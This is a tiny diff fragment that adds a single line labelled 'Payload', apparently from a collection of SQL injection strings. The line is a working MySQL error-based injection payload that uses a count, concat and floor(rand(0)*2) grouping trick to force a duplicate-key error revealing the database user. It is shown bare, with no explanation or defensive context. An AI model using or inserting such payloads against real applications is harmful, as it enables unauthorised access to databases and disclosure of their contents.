@@ -1,0 +1,2 @@
+Payload：
+and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)
